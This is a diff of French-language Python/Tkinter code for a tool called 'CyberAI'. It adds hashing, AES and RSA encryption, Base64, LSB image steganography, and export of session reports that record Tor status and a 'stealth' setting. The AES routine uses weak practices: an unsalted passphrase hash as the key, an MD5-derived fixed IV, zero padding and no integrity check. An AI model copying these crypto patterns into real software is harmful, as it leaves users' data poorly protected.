+        btnf = ttk.Frame(f)
+        btnf.grid(row=2, column=0, columnspan=4, pady=6)
+        ttk.Button(btnf, text="Cacher le message", command=self.run_stego_encode, width=20).pack(side=tk.LEFT, padx=3)
+        ttk.Button(btnf, text="Extraire le message", command=self.run_stego_decode, width=20).pack(side=tk.LEFT, padx=3)
+        ttk.Label(btnf, text="Note: utilise LSB sur les canaux RGB", foreground="gray").pack(side=tk.LEFT, padx=10)
+
+    # ── Hash ──
+    def run_hash_text(self):
+        self.clear(self.output)
+        self.run_thread(self.do_hash_text)
+
+    def do_hash_text(self):
+        data = self.hash_input.get("1.0", tk.END).strip()
+        if not data:
+            messagebox.showwarning("Attention", "Entrez du texte à hacher.")
+            return
+        algo = self.hash_algo.get()
+        try:
+            h = self._compute_hash(data.encode(), algo)
+            self.log(self.output, f"Entrée ({len(data)} octets):", "bold")
+            self.log(self.output, f"  {data[:200]}{'...' if len(data)>200 else ''}")
+            self.log(self.output, f"\n{algo}:", "bold")
+            self.log(self.output, f"  {h}", "success")
+        except Exception as e:
+            self.log(self.output, f"Erreur: {e}", "error")
+
+    def run_hash_file(self):
+        fpath = filedialog.askopenfilename(title="Choisir un fichier")
+        if not fpath:
+            return
+        self.clear(self.output)
+        self.run_thread(lambda: self.do_hash_file(fpath))
+
+    def do_hash_file(self, fpath):
+        algo = self.hash_algo.get()
+        self.log(self.output, f"Hachage ({algo}) du fichier: {fpath}", "bold")
+        try:
+            h = self._hash_file(fpath, algo)
+            self.log(self.output, f"  {algo}: {h}", "success")
+        except Exception as e:
+            self.log(self.output, f"Erreur: {e}", "error")
+
+    def _compute_hash(self, data, algo):
+        if algo == "MD5":
+            return hashlib.md5(data).hexdigest()
+        elif algo == "SHA1":
+            return hashlib.sha1(data).hexdigest()
+        elif algo == "SHA256":
+            return hashlib.sha256(data).hexdigest()
+        elif algo == "SHA512":
+            return hashlib.sha512(data).hexdigest()
+        elif algo == "SHA3-256":
+            return hashlib.sha3_256(data).hexdigest()
+        elif algo == "BLAKE2b":
+            return hashlib.blake2b(data).hexdigest()
+        return "Algorithme inconnu"
+
+    def _hash_file(self, fpath, algo):
+        h = None
+        if algo == "MD5":
+            h = hashlib.md5()
+        elif algo == "SHA1":
+            h = hashlib.sha1()
+        elif algo == "SHA256":
+            h = hashlib.sha256()
+        elif algo == "SHA512":
+            h = hashlib.sha512()
+        elif algo == "SHA3-256":
+            h = hashlib.sha3_256()
+        elif algo == "BLAKE2b":
+            h = hashlib.blake2b()
+        if h is None:
+            raise ValueError("Algorithme inconnu")
+        with open(fpath, "rb") as f:
+            for chunk in iter(lambda: f.read(65536), b""):
+                h.update(chunk)
+        return h.hexdigest()
+
+    # ── AES ──
+    def gen_aes_key(self):
+        key = secrets.token_hex(16)
+        self.aes_key.delete(0, tk.END)
+        self.aes_key.insert(0, key)
+
+    def gen_aes_iv(self):
+        iv = secrets.token_hex(8)
+        self.aes_iv.delete(0, tk.END)
+        self.aes_iv.insert(0, iv)
+
+    def run_aes_encrypt(self):
+        self.clear(self.output)
+        self.run_thread(self.do_aes_encrypt)
+
+    def do_aes_encrypt(self):
+        key = self.aes_key.get().strip()
+        iv = self.aes_iv.get().strip()
+        data = self.aes_input.get("1.0", tk.END).strip()
+        if not key or not iv or not data:
+            messagebox.showwarning("Attention", "Remplissez clé, IV et données.")
+            return
+        try:
+            from Crypto.Cipher import AES
+            k = hashlib.sha256(key.encode()).digest()
+            iv_bytes = hashlib.md5(iv.encode()).digest()
+            cipher = AES.new(k, AES.MODE_CBC, iv_bytes)
+            padded = data.encode()
+            while len(padded) % 16 != 0:
+                padded += b"\x00"
+            ct = cipher.encrypt(padded)
+            result = base64.b64encode(ct).decode()
+            self.log(self.output, "Texte chiffré (AES-256-CBC, base64):", "bold")
+            self.log(self.output, result, "success")
+        except ImportError:
+            self.log(self.output, "pycryptodome requis: pip install pycryptodome", "error")
+        except Exception as e:
+            self.log(self.output, f"Erreur: {e}", "error")
+
+    def run_aes_decrypt(self):
+        self.clear(self.output)
+        self.run_thread(self.do_aes_decrypt)
+
+    def do_aes_decrypt(self):
+        key = self.aes_key.get().strip()
+        iv = self.aes_iv.get().strip()
+        data = self.aes_input.get("1.0", tk.END).strip()
+        if not key or not iv or not data:
+            messagebox.showwarning("Attention", "Remplissez clé, IV et données chiffrées.")
+            return
+        try:
+            from Crypto.Cipher import AES
+            k = hashlib.sha256(key.encode()).digest()
+            iv_bytes = hashlib.md5(iv.encode()).digest()
+            cipher = AES.new(k, AES.MODE_CBC, iv_bytes)
+            ct = base64.b64decode(data)
+            pt = cipher.decrypt(ct).rstrip(b"\x00").decode()
+            self.log(self.output, "Texte déchiffré:", "bold")
+            self.log(self.output, pt, "success")
+        except Exception as e:
+            self.log(self.output, f"Erreur: {e}", "error")
+
+    def run_aes_encrypt_file(self):
+        fpath = filedialog.askopenfilename(title="Choisir un fichier à chiffrer")
+        if not fpath:
+            return
+        self.clear(self.output)
+        self.run_thread(lambda: self.do_aes_file(fpath, encrypt=True))
+
+    def run_aes_decrypt_file(self):
+        fpath = filedialog.askopenfilename(title="Choisir un fichier à déchiffrer")
+        if not fpath:
+            return
+        self.clear(self.output)
+        self.run_thread(lambda: self.do_aes_file(fpath, encrypt=False))
+
+    def do_aes_file(self, fpath, encrypt=True):
+        key = self.aes_key.get().strip()
+        iv = self.aes_iv.get().strip()
+        if not key or not iv:
+            messagebox.showwarning("Attention", "Entrez une clé et un IV.")
+            return
+        try:
+            from Crypto.Cipher import AES
+            k = hashlib.sha256(key.encode()).digest()
+            iv_bytes = hashlib.md5(iv.encode()).digest()
+            cipher = AES.new(k, AES.MODE_CBC, iv_bytes)
+            ext = ".enc" if encrypt else ".dec"
+            outpath = fpath + ext
+            with open(fpath, "rb") as f_in:
+                data = f_in.read()
+            if encrypt:
+                while len(data) % 16 != 0:
+                    data += b"\x00"
+                result = cipher.encrypt(data)
+            else:
+                result = cipher.decrypt(data).rstrip(b"\x00")
+            with open(outpath, "wb") as f_out:
+                f_out.write(result)
+            self.log(self.output, f"{'Chiffré' if encrypt else 'Déchiffré'}: {outpath}", "success")
+            self.log(self.output, f"Taille: {len(result)} octets", "success")
+        except ImportError:
+            self.log(self.output, "pycryptodome requis", "error")
+        except Exception as e:
+            self.log(self.output, f"Erreur: {e}", "error")
+
+    # ── RSA ──
+    def run_rsa_gen(self):
+        self.clear(self.output)
+        self.run_thread(self.do_rsa_gen)
+
+    def do_rsa_gen(self):
+        size = int(self.rsa_size.get())
+        self.log(self.output, f"Génération d'une paire de clés RSA-{size}...", "bold")
+        try:
+            from Crypto.PublicKey import RSA
+            key = RSA.generate(size)
+            pub = key.publickey().export_key().decode()
+            priv = key.export_key().decode()
+            self.rsa_pub.delete("1.0", tk.END)
+            self.rsa_pub.insert("1.0", pub)
+            self.rsa_priv.delete("1.0", tk.END)
+            self.rsa_priv.insert("1.0", priv)
+            self.log(self.output, f"Clés RSA-{size} générées avec succès.", "success")
+            self.log(self.output, f"Clé publique:\n{pub[:200]}...")
+            self.log(self.output, f"Clé privée stockée dans le champ ci-dessous.")
+        except ImportError:
+            self.log(self.output, "pycryptodome requis: pip install pycryptodome", "error")
+        except Exception as e:
+            self.log(self.output, f"Erreur: {e}", "error")
+
+    def run_rsa_encrypt(self):
+        self.clear(self.output)
+        self.run_thread(self.do_rsa_encrypt)
+
+    def do_rsa_encrypt(self):
+        msg = self.rsa_input.get("1.0", tk.END).strip()
+        pub_key_text = self.rsa_pub.get("1.0", tk.END).strip()
+        if not msg:
+            messagebox.showwarning("Attention", "Entrez un message.")
+            return
+        if not pub_key_text:
+            messagebox.showwarning("Attention", "Générez ou collez une clé publique.")
+            return
+        try:
+            from Crypto.PublicKey import RSA
+            from Crypto.Cipher import PKCS1_OAEP
+            key = RSA.import_key(pub_key_text.encode())
+            cipher = PKCS1_OAEP.new(key)
+            ct = cipher.encrypt(msg.encode()[:190])
+            result = base64.b64encode(ct).decode()
+            self.log(self.output, "Message chiffré (RSA-OAEP, base64):", "bold")
+            self.log(self.output, result, "success")
+        except ImportError:
+            self.log(self.output, "pycryptodome requis", "error")
+        except ValueError as e:
+            self.log(self.output, f"Message trop long pour RSA-{key.size_in_bits()}. Max ~{key.size_in_bytes()-66} octets.", "error")
+        except Exception as e:
+            self.log(self.output, f"Erreur: {e}", "error")
+
+    def run_rsa_decrypt(self):
+        self.clear(self.output)
+        self.run_thread(self.do_rsa_decrypt)
+
+    def do_rsa_decrypt(self):
+        data = self.rsa_input.get("1.0", tk.END).strip()
+        priv_key_text = self.rsa_priv.get("1.0", tk.END).strip()
+        if not data or not priv_key_text:
+            messagebox.showwarning("Attention", "Entrez des données chiffrées et une clé privée.")
+            return
+        try:
+            from Crypto.PublicKey import RSA
+            from Crypto.Cipher import PKCS1_OAEP
+            key = RSA.import_key(priv_key_text.encode())
+            cipher = PKCS1_OAEP.new(key)
+            ct = base64.b64decode(data)
+            pt = cipher.decrypt(ct).decode()
+            self.log(self.output, "Message déchiffré:", "bold")
+            self.log(self.output, pt, "success")
+        except Exception as e:
+            self.log(self.output, f"Erreur: {e}", "error")
+
+    # ── Base64 ──
+    def run_b64_encode(self):
+        self.clear(self.output)
+        self.run_thread(self.do_b64_encode)
+
+    def do_b64_encode(self):
+        data = self.b64_input.get("1.0", tk.END).strip()
+        if not data:
+            messagebox.showwarning("Attention", "Entrez des données.")
+            return
+        try:
+            encoded = base64.b64encode(data.encode()).decode()
+            self.log(self.output, "Encodé en Base64:", "bold")
+            self.log(self.output, encoded, "success")
+        except Exception as e:
+            self.log(self.output, f"Erreur: {e}", "error")
+
+    def run_b64_decode(self):
+        self.clear(self.output)
+        self.run_thread(self.do_b64_decode)
+
+    def do_b64_decode(self):
+        data = self.b64_input.get("1.0", tk.END).strip()
+        if not data:
+            messagebox.showwarning("Attention", "Entrez du Base64.")
+            return
+        try:
+            decoded = base64.b64decode(data).decode()
+            self.log(self.output, "Décodé (Base64 → texte):", "bold")
+            self.log(self.output, decoded, "success")
+        except Exception as e:
+            self.log(self.output, f"Erreur (pas du Base64 valide?): {e}", "error")
+
+    def run_b64_encode_file(self):
+        fpath = filedialog.askopenfilename(title="Choisir un fichier à encoder")
+        if not fpath:
+            return
+        self.clear(self.output)
+        self.run_thread(lambda: self.do_b64_file(fpath, encode=True))
+
+    def run_b64_decode_file(self):
+        fpath = filedialog.askopenfilename(title="Choisir un fichier .b64 à décoder")
+        if not fpath:
+            return
+        self.clear(self.output)
+        self.run_thread(lambda: self.do_b64_file(fpath, encode=False))
+
+    def do_b64_file(self, fpath, encode=True):
+        try:
+            with open(fpath, "rb") as f:
+                data = f.read()
+            if encode:
+                result = base64.b64encode(data).decode()
+                outpath = fpath + ".b64"
+                with open(outpath, "w") as f:
+                    f.write(result)
+                self.log(self.output, f"Fichier encodé: {outpath}", "success")
+            else:
+                raw = data.decode()
+                decoded = base64.b64decode(raw)
+                outpath = fpath.replace(".b64", "") + ".decoded"
+                with open(outpath, "wb") as f:
+                    f.write(decoded)
+                self.log(self.output, f"Fichier décodé: {outpath}", "success")
+            self.log(self.output, f"Taille: {len(data)} → {len(result) if encode else len(decoded)} octets")
+        except Exception as e:
+            self.log(self.output, f"Erreur: {e}", "error")
+
+    # ── Stéganographie ──
+    def browse_stego_image(self):
+        fpath = filedialog.askopenfilename(title="Choisir une image PNG",
+                                           filetypes=[("PNG", "*.png"), ("Tous", "*.*")])
+        if fpath:
+            self.stego_path.delete(0, tk.END)
+            self.stego_path.insert(0, fpath)
+
+    def run_stego_encode(self):
+        self.clear(self.output)
+        self.run_thread(self.do_stego_encode)
+
+    def do_stego_encode(self):
+        fpath = self.stego_path.get().strip()
+        msg = self.stego_msg.get("1.0", tk.END).strip()
+        if not fpath or not msg:
+            messagebox.showwarning("Attention", "Choisissez une image et un message.")
+            return
+        try:
+            from PIL import Image
+            img = Image.open(fpath).convert("RGB")
+            pixels = img.load()
+            w, h = img.size
+            data = (msg + "\x00").encode()
+            bits = "".join(format(b, "08b") for b in data)
+            if len(bits) > w * h * 3:
+                self.log(self.output, "Message trop long pour cette image.", "error")
+                return
+            idx = 0
+            for y in range(h):
+                for x in range(w):
+                    if idx >= len(bits):
+                        break
+                    r, g, b = pixels[x, y]
+                    r = (r & 0xFE) | int(bits[idx]) if idx < len(bits) else r; idx += 1
+                    g = (g & 0xFE) | int(bits[idx]) if idx < len(bits) else g; idx += 1
+                    b = (b & 0xFE) | int(bits[idx]) if idx < len(bits) else b; idx += 1
+                    pixels[x, y] = (r, g, b)
+                if idx >= len(bits):
+                    break
+            outpath = fpath.replace(".png", "_stego.png")
+            img.save(outpath)
+            self.log(self.output, f"Message caché dans: {outpath}", "success")
+            self.log(self.output, f"Taille du message: {len(msg)} caractères ({len(bits)} bits)")
+        except ImportError:
+            self.log(self.output, "PIL requis: pip install Pillow", "error")
+        except Exception as e:
+            self.log(self.output, f"Erreur: {e}", "error")
+
+    def run_stego_decode(self):
+        self.clear(self.output)
+        self.run_thread(self.do_stego_decode)
+
+    def do_stego_decode(self):
+        fpath = self.stego_path.get().strip()
+        if not fpath:
+            messagebox.showwarning("Attention", "Choisissez une image stégano.")
+            return
+        try:
+            from PIL import Image
+            img = Image.open(fpath).convert("RGB")
+            pixels = img.load()
+            w, h = img.size
+            bits = []
+            for y in range(h):
+                for x in range(w):
+                    r, g, b = pixels[x, y]
+                    bits.append(r & 1)
+                    bits.append(g & 1)
+                    bits.append(b & 1)
+            chars = []
+            for i in range(0, len(bits), 8):
+                byte = 0
+                for j in range(8):
+                    if i + j < len(bits):
+                        byte = (byte << 1) | bits[i + j]
+                if byte == 0:
+                    break
+                chars.append(chr(byte))
+            msg = "".join(chars)
+            if msg:
+                self.log(self.output, "Message extrait:", "bold")
+                self.log(self.output, msg, "success")
+            else:
+                self.log(self.output, "Aucun message trouvé.", "warning")
+        except ImportError:
+            self.log(self.output, "PIL requis: pip install Pillow", "error")
+        except Exception as e:
+            self.log(self.output, f"Erreur: {e}", "error")
+
+
+# ════════════════════════ 11. REPORTING ════════════════════════
+class ReportingTab(BaseTab):
+    def __init__(self, parent, app):
+        super().__init__(parent, app)
+        self.build()
+
+    def build(self):
+        main = ttk.Frame(self.parent)
+        main.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
+
+        f = ttk.LabelFrame(main, text="Export des Résultats")
+        f.pack(fill=tk.X, pady=(0, 8))
+
+        ttk.Label(f, text="Ce module exporte tous les logs et résultats des sessions dans différents formats.", foreground="gray").grid(
+            row=0, column=0, columnspan=4, padx=10, pady=5)
+
+        btnf = ttk.Frame(f)
+        btnf.grid(row=1, column=0, columnspan=4, pady=10)
+        ttk.Button(btnf, text="📄 Exporter en HTML", command=self.run_export_html, width=22).pack(side=tk.LEFT, padx=5)
+        ttk.Button(btnf, text="📋 Exporter en JSON", command=self.run_export_json, width=22).pack(side=tk.LEFT, padx=5)
+        ttk.Button(btnf, text="📝 Exporter en TXT", command=self.run_export_txt, width=22).pack(side=tk.LEFT, padx=5)
+        ttk.Button(btnf, text="📊 Rapport complet", command=self.run_full_report, width=22).pack(side=tk.LEFT, padx=5)
+
+        info = ttk.LabelFrame(main, text="Dernier rapport")
+        info.pack(fill=tk.BOTH, expand=True, pady=(0, 6))
+        self.report_preview = scrolledtext.ScrolledText(info, height=14, font=("Consolas", 9), state="normal")
+        self.report_preview.pack(fill=tk.BOTH, expand=True, padx=8, pady=8)
+
+        self.output = self.make_output(main)
+
+    def _gather_logs(self):
+        logs = {}
+        for tab_cls, tab_instance in self.app.tabs.items():
+            name = tab_cls.__name__
+            if hasattr(tab_instance, "output"):
+                try:
+                    content = tab_instance.output.get("1.0", tk.END).strip()
+                    if content:
+                        logs[name] = content
+                except tk.TclError:
+                    pass
+        return logs
+
+    def run_export_html(self):
+        self.clear(self.output)
+        self.run_thread(self.do_export_html)
+
+    def do_export_html(self):
+        logs = self._gather_logs()
+        if not logs:
+            self.log(self.output, "Aucun log à exporter.", "warning")
+            return
+        fname = filedialog.asksaveasfilename(defaultextension=".html",
+                                               filetypes=[("HTML", "*.html")])
+        if not fname:
+            return
+        try:
+            html = self._build_html_report(logs)
+            with open(fname, "w", encoding="utf-8") as f:
+                f.write(html)
+            self.log(self.output, f"Rapport HTML généré: {fname}", "success")
+            self.report_preview.delete("1.0", tk.END)
+            self.report_preview.insert(tk.END, f"Rapport exporté: {fname}\n")
+            self.report_preview.insert(tk.END, f"Tabs: {', '.join(logs.keys())}\n")
+            self.report_preview.insert(tk.END, f"Taille: {len(html)} octets\n")
+        except Exception as e:
+            self.log(self.output, f"Erreur: {e}", "error")
+
+    def run_export_json(self):
+        self.clear(self.output)
+        self.run_thread(self.do_export_json)
+
+    def do_export_json(self):
+        logs = self._gather_logs()
+        if not logs:
+            self.log(self.output, "Aucun log à exporter.", "warning")
+            return
+        fname = filedialog.asksaveasfilename(defaultextension=".json",
+                                               filetypes=[("JSON", "*.json")])
+        if not fname:
+            return
+        try:
+            report = {
+                "tool": "CyberAI",
+                "timestamp": datetime.now().isoformat(),
+                "tor_status": self.app.tor.status_text,
+                "tor_ip": self.app.tor.current_ip,
+                "stealth": "ON" if self.app.stealth["enabled"] else "OFF",
+                "logs": logs,
+            }
+            with open(fname, "w", encoding="utf-8") as f:
+                json.dump(report, f, indent=2, ensure_ascii=False)
+            self.log(self.output, f"Rapport JSON généré: {fname}", "success")
+            self.report_preview.delete("1.0", tk.END)
+            self.report_preview.insert(tk.END, json.dumps(report, indent=2, ensure_ascii=False)[:2000])
+        except Exception as e:
+            self.log(self.output, f"Erreur: {e}", "error")
+
+    def run_export_txt(self):
+        self.clear(self.output)
+        self.run_thread(self.do_export_txt)
+
+    def do_export_txt(self):
+        logs = self._gather_logs()
+        if not logs:
+            self.log(self.output, "Aucun log à exporter.", "warning")
+            return
+        fname = filedialog.asksaveasfilename(defaultextension=".txt",
+                                               filetypes=[("Texte", "*.txt")])
+        if not fname:
+            return
+        try:
+            with open(fname, "w", encoding="utf-8") as f:
+                f.write(f"CyberAI - Rapport de Session\n")
+                f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
+                f.write(f"{'='*60}\n\n")
+                for name, content in logs.items():
+                    f.write(f"--- {name} ---\n")
+                    f.write(content)
+                    f.write(f"\n{'='*60}\n\n")
+            self.log(self.output, f"Rapport TXT généré: {fname}", "success")
+            self.report_preview.delete("1.0", tk.END)
+            self.report_preview.insert(tk.END, f"Rapport TXT: {fname}\n")
+            self.report_preview.insert(tk.END, f"Tabs: {', '.join(logs.keys())}\n")
+        except Exception as e:
+            self.log(self.output, f"Erreur: {e}", "error")
+
+    def run_full_report(self):
+        self.clear(self.output)
+        self.run_thread(self.do_full_report)
+
+    def do_full_report(self):
+        logs = self._gather_logs()
+        if not logs:
+            self.log(self.output, "Aucun log. Lancez d'abord des analyses.", "warning")
+            return
+        fname = filedialog.asksaveasfilename(defaultextension=".html",
+                                               filetypes=[("HTML", "*.html")])
+        if not fname:
+            return
+        try:
+            html = self._build_html_report(logs)
+            with open(fname, "w", encoding="utf-8") as f:
+                f.write(html)
+            self.log(self.output, f"Rapport complet généré: {fname}", "success")
+            self.log(self.output, f"Contenu: {len(logs)} onglets, {len(html)} octets", "bold")
+            self.report_preview.delete("1.0", tk.END)
+            self.report_preview.insert(tk.END, f"Rapport complet: {fname}\n")
+            for name in logs:
+                lines = logs[name].count("\n")
+                self.report_preview.insert(tk.END, f"  {name}: {lines} lignes\n")
+        except Exception as e:
+            self.log(self.output, f"Erreur: {e}", "error")
+
+    def _build_html_report(self, logs):
+        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        sections = ""
+        for name, content in logs.items():
+            safe_content = content.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
+            safe_content = safe_content.replace("\n", "<br>\n")
+            sections += f"""
+            <div class="section">
+                <h2>{name}</h2>
+                <pre>{safe_content}</pre>
+            </div>"""
+        return f"""<!DOCTYPE html>
+<html lang="fr">
+<head><meta charset="UTF-8">
+<title>CyberAI - Rapport</title>
+<style>
+*{{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',Arial,sans-serif}}
+body{{background:#0d1117;color:#c9d1d9;padding:20px}}
+h1{{color:#58a6ff;border-bottom:2px solid #30363d;padding-bottom:10px;margin-bottom:20px}}
+h2{{color:#f0883e;margin:20px 0 10px 0}}
+pre{{background:#161b22;border:1px solid #30363d;border-radius:6px;padding:16px;overflow-x:auto;font-family:'Consolas','Courier New',monospace;font-size:13px;line-height:1.5;white-space:pre-wrap}}
+.section{{margin-bottom:30px}}
+.footer{{text-align:center;color:#8b949e;margin-top:40px;font-size:12px}}
+</style>
+</head>
+<body>
+<h1>🛡️ CyberAI — Rapport de Sécurité</h1>
+<p style="margin-bottom:20px;color:#8b949e">Généré le {now}</p>
+{sections}
+<div class="footer">Rapport généré par CyberAI v2.0</div>
+</body>
+</html>"""
 
 
 # ════════════════════════ MAIN ════════════════════════
